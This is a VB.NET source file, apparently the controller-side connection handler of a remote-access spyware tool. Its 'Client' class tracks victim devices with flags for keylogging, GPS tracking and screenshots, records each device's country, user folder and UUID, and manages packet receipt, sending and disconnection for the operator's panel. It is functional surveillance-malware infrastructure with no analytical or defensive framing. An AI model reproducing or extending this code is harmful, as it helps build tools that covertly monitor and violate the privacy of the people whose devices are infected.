Namespace sockets
    Public Class Client

        Public Keys As String

        Public ClientAddressIP As String

        Public ClientRemoteAddress As String

        Public ClientLocalAddress As String

        Public buffer As Byte()

        Public MemoryStream As IO.MemoryStream

        Public Maxsize As Long

        Public Count As Integer

        Public SizeData As Object()

        Public Rows As Windows.Forms.DataGridViewRow

        Public qit, qitGPS, shot, Keylogg As Boolean

        Public Flag As Bitmap

        Public Country As String

        Public ClientName As String

        Public UUID As String

        Public FolderUSER As String

        Public host As String

        Public Statistics As String

        Public SyncData As List(Of Object())

        Public Workers() As ComponentModel.BackgroundWorker

        Public ID As Integer = 0

        Public Lock As Object = New Object()

        Public EXI As Boolean = False

        Public Wallpaper(2) As Object

        Public power As Boolean = False

        Public CountPoing As Integer = 0

        Public VersionClient As String = "n/a"

        Public Sub New(ByVal ParametersClient As Net.Sockets.TcpClient, ByVal ParametersInteger As Integer)

            Try

                Me.Wallpaper(0) = Nothing

                Me.Wallpaper(1) = Nothing

                Me.Maxsize = -1

                Me.Count = -1

                Me.Country = "null"

                Me.ClientName = "null"

                Me.SyncData = New List(Of Object())

                Me.ID = 0

                Me.Statistics = "null"

                Me.host = "null"

                Me.FolderUSER = "null"

                Me.UUID = "null"

                Me.shot = True

                Me.qitGPS = False

                Me.qit = False

                Me.Keylogg = False

                Me.Keys = "0.0.0.0:0:null:null:null:null:0.0.0.0:0000:0"

                Me.Rows = Nothing

                Me.MemoryStream = New IO.MemoryStream

                Me.buffer = New Byte(1 - 1) {}

                Me.SizeData = {-1, -1}

                Me.ClientRemoteAddress = CType(ParametersClient.Client.RemoteEndPoint, Net.IPEndPoint).ToString()

                Me.ClientAddressIP = CType(ParametersClient.Client.RemoteEndPoint, Net.IPEndPoint).Address.ToString()

                Me.ClientLocalAddress = String.Format("{0}:{1}", Me.ClientAddressIP, CStr(ParametersInteger))

                ParametersClient.Client.BeginReceive(Me.buffer, 0, Me.buffer.Length, Net.Sockets.SocketFlags.None, New AsyncCallback(AddressOf Me.DataRecieved), ParametersClient)

            Catch ex As Exception

                Me.Close(ParametersClient)

            End Try

        End Sub

        Public Sub Send(ByVal ParametersObject As Object())

            Select Case SpySettings.FLAGS_PERFORMANCE

                Case "High"

                    Async6(ParametersObject)

                Case "Normal"

                    Dim isPlugin As String = DirectCast(ParametersObject(1), String).Split({sockets.Data.SPL_SOCKET}, StringSplitOptions.None)(0)

                    If isPlugin = "0" Then

                        infoServer.RequestsSender.ListWorker.Add(ParametersObject)

                    Else

                        Async6(ParametersObject)

                    End If

                Case "Low"

                    infoServer.RequestsSender.ListWorker.Add(ParametersObject)

            End Select

        End Sub
        Public Sub Async6(ByVal ParametersObject As Object())

            Me.ID = Me.ID + 1

            ReDim Me.Workers(Me.ID)

            Me.Workers(Me.ID) = New ComponentModel.BackgroundWorker

            Me.Workers(Me.ID).WorkerSupportsCancellation = True

            AddHandler Me.Workers(Me.ID).DoWork, AddressOf Me.WorkerDoWork

            Me.SyncData.Add(ParametersObject)

            Me.Workers(Me.ID).RunWorkerAsync()

            Threading.Thread.Sleep(1)

        End Sub

        Public Sub WorkerDoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs)

            SyncLock Data.SyncWorkerRequests

                infoServer.WorkerRequests.Add(1)

            End SyncLock

            SyncLock Lock

                If SyncData.Count > 0 Then

                    Dim Client As Net.Sockets.TcpClient = Nothing

                    Dim ClassClient As sockets.Client = Nothing

                    Try

                        Dim ParametersObject As Object() = SyncData.Item(0)

                        Client = CType(ParametersObject(0), Net.Sockets.TcpClient)

                        ClassClient = DirectCast(ParametersObject(3), sockets.Client)

                        Dim errorCode As Net.Sockets.SocketError

                        Dim bByte As Byte() = Codes.FormatPacket(DirectCast(ParametersObject(1), String), DirectCast(ParametersObject(2), Byte()))

                        Client.Client.Poll(infoServer.Microseconds, Net.Sockets.SelectMode.SelectWrite)

                        Client.Client.SendBufferSize = bByte.Length

                        Client.Client.BeginSend(bByte, 0, bByte.Length, Net.Sockets.SocketFlags.None, errorCode, New AsyncCallback(AddressOf EndSend), Client)

                        If Not errorCode = Net.Sockets.SocketError.Success Then

                            If ClassClient IsNot Nothing Then

                                ClassClient.Close(Client)

                            End If


                        End If

                        infoServer.BytesSent += bByte.Length

                    Catch SocketException As Net.Sockets.SocketException

                        If ClassClient IsNot Nothing Then

                            ClassClient.Close(Client)

                        End If

                    Catch SocketDisposed As System.ObjectDisposedException

                        If ClassClient IsNot Nothing Then

                            ClassClient.Close(Client)

                        End If

                    End Try

                    SyncData.RemoveAt(0)

                End If

            End SyncLock

            SyncLock Data.SyncWorkerRequests

                infoServer.WorkerRequests.RemoveAt(0)

            End SyncLock

        End Sub

        Public Sub DataRecieved(ByVal ar As IAsyncResult)

            Dim Client As Net.Sockets.TcpClient = CType(ar.AsyncState, Net.Sockets.TcpClient)

            Try

                Dim DataSize As Integer = 0

                Dim errorCode As Net.Sockets.SocketError

                DataSize = If(Client.Client.Connected, Client.Client.EndReceive(ar, errorCode), 0)

                If Not errorCode = Net.Sockets.SocketError.Success Then

                    DataSize = -100

                End If

                If DataSize > 0 Then


                    infoServer.BytesReceived += DataSize

                    If Maxsize = -1 Then

                        If Me.buffer(0) = 0 Then

                            Me.MemoryStream.WriteByte(Me.buffer(0))

                            Count += 1

                            If Count = 1 Then

                                Dim GetSize As String = Codes.Encoding().GetString(Me.MemoryStream.ToArray).Trim

                                Dim SPL As String() = GetSize.Split({ChrW(0)}, StringSplitOptions.None)

                                Dim SSize As Long = If(IsNumeric(SPL(0).Trim), CLng(SPL(0).Trim), 0)

                                Dim BSize As Long = If(IsNumeric(SPL(1).Trim), CLng(SPL(1).Trim), 0)

                                SizeData = {SSize, BSize}

                                Maxsize = SSize + BSize

                                Dim CRB As Long = Maxsize

                                Client.Client.ReceiveBufferSize = CRB

                                Count = -1

                                Me.buffer = New Byte((CInt((Me.Maxsize - 1)) + 1) - 1) {}

                                Me.MemoryStream.Dispose()

                                Me.MemoryStream = New IO.MemoryStream

                            End If

                        Else

                            Me.MemoryStream.WriteByte(Me.buffer(0))

                        End If

                    Else

                        Me.MemoryStream.Write(Me.buffer, 0, DataSize)

                        If Me.MemoryStream.ToArray.Length = Maxsize Then

                            SyncLock Data.SyncRequestsReceiver

                                Dim i As New ListData(Me, Me.MemoryStream.ToArray, SizeData, Client)

                                infoServer.RequestsReceiver.Add(i)

                                Me.MemoryStream.Dispose()

                                Me.MemoryStream = New IO.MemoryStream

                                SizeData = {-1, -1}

                                Maxsize = -1

                                Me.buffer = New Byte(1 - 1) {}

                            End SyncLock

                        Else

                            Me.buffer = New Byte((CInt(((Me.Maxsize - Me.MemoryStream.Length) - 1)) + 1) - 1) {}

                        End If

                    End If

                    If Client.Client.Connected Then

                        Try
                            Client.Client.BeginReceive(Me.buffer, 0, Me.buffer.Length, Net.Sockets.SocketFlags.None, New AsyncCallback(AddressOf Me.DataRecieved), Client)

                        Catch ex As System.Exception

                            Me.Close(Client)

                        End Try

                    Else

                        Me.Close(Client)

                    End If

                Else

                    If DataSize = -100 Then

                        Me.Close(Client)

                    End If

                End If

            Catch ex As Exception

                Me.Close(Client)

            End Try

        End Sub

        Public Async Sub Close(ByVal Client As Net.Sockets.TcpClient)

            EXI = True

            Await Task.Factory.StartNew(Function() Disconnect(Client), TaskCreationOptions.None)

        End Sub

        Private Function Disconnect(ByVal Client As Net.Sockets.TcpClient)

            If Me.MemoryStream IsNot Nothing Then

                Try

                    Me.MemoryStream.Dispose()

                Catch ex As Exception

                End Try


            End If

            If Client IsNot Nothing Then

                Try

                    If Client.Client.Connected Then

                        Client.GetStream.Close()

                    End If

                Catch ex As Exception

                End Try

            End If

            If Client IsNot Nothing Then

                Try

                    If Client.Client.Connected Then

                        Client.Client.Close()

                    End If

                Catch ex As Exception

                End Try

            End If

            If Me.Rows IsNot Nothing Then

                Try

                    SyncLock Data.SyncWorkerRemove

                        infoServer.WorkerRemove.Add(Me.Rows)

                        Me.Rows = Nothing

                    End SyncLock

                Catch xErrors As Exception

                End Try

            End If


            If Me.ClientRemoteAddress IsNot Nothing Then

                SyncLock Data.SyncClientsOnline

                    If infoServer.ClientsOnline.Contains(Me.ClientRemoteAddress) Then

                        infoServer.ClientsOnline.Remove(Me.ClientRemoteAddress)

                    End If

                End SyncLock

            End If

            Return Nothing

        End Function

        Public Function Progresr() As Integer

            Dim vul As Integer

            If Me.Maxsize = -1 Then

                Return vul

            End If

            Try

                vul = RateConverter(CInt(Me.MemoryStream.Length), CInt(Me.Maxsize))

                Return vul

            Catch ex As System.ObjectDisposedException

                Return 0

            End Try

        End Function
        Public Function RateConverter(ByVal Value As Integer, ByVal Totalsize As Integer) As Integer

            Try

                If Totalsize = 0 Then

                    Return 0

                End If

                Return CInt(Math.Round(CDbl(((CDbl(Value) / CDbl(Totalsize)) * 100))))

            Catch ex As Exception

                Return 0

            End Try

        End Function

        Private Sub EndSend(ByVal ar As IAsyncResult)

            Try

                Dim Client As Net.Sockets.TcpClient = CType(ar.AsyncState, Net.Sockets.TcpClient)

                Client.Client.EndSend(ar)

            Catch nextError As Exception

            End Try

        End Sub

    End Class

End Namespace
